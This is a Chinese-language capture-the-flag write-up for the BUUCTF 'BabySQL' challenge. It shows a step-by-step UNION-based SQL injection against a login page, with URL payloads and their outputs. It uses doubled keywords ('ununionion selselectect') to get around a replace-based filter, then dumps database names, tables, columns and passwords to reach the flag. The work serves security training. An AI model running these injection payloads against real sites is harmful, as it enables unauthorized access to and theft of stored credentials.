# [[极客大挑战 2019]BabySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BabySQL)



## 0x00先判断闭合



```sql
http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password=admin'
```



结果为



```sql
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''admin''' at line 1
```



此为字符型注入



## 0x01使用order by 判断列数



```sql
http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='order by 1%23'
```



发现报错



```sql
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'der 1#''' at line 1
```



通过报错报错发现or被屏蔽了，继续试了几个关键字发现都被屏蔽了，猜测应该是用函数replace给我们替换成了空白字符



## 0x01直接采用拼接字符的方法绕过



直接用联合查询猜回显



````sql
http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,3%23'
````



猜测成功，成功绕过,发现回显



```sql
Hello 2！

Your password is '3'
```



## 0x02直接用payload进行爆库等操作



```sql
http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,database(),version()%23'

http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,user(),@@version_compile_os%23'
```



结果为

database		geek！

version		10.3.18-MariaDB

user		root@localhost！

平台		Linux



## 0x03继续爆表名



```sql
http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema= 'geek'%23'
```



结果为



```sql
Hello 2！

Your password is 'b4bsql,geekuser'
```



## 0x04直接查看b4bsql,geekuser两个表中的字段



```sql
http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name= 'b4bsql'%23'

http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name= 'geekuser'%23'
```



两个表的结果都为



```sql
Hello 2！

Your password is 'id,username,password'
```



## 0x05查看两个表下字段的详细信息



```sql
http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,username frfromom b4bsql%23

http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,passwoorrd frfromom b4bsql%23
```



结果分别为



```sql
Hello 2！

Your password is 'cl4y'

Hello 2！

Your password is 'i_want_to_play_2077'
```



这里走弯路了，**可以直接用group_concat子句将password列下的所有字段显示出来**，直接找到flag



```sql
http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,group_concat(passwoorrd) frfromom b4bsql%23
```



结果为



```sql
Hello 2！

Your password is 'i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag{19deb901-dfac-433a-840b-5e7b463f8adf}'
```



**找到flag**

flag{19deb901-dfac-433a-840b-5e7b463f8adf}



## 0x06补充



### [SQL REPLACE()字符串替换函数](https://www.w3cschool.cn/sql/sql-replace.html)

将设定好的关键字替换为想要的字符（这里是将or,select等关键字替换为空字符所以才能用拼接字符的方法绕过）



作者

SihUi
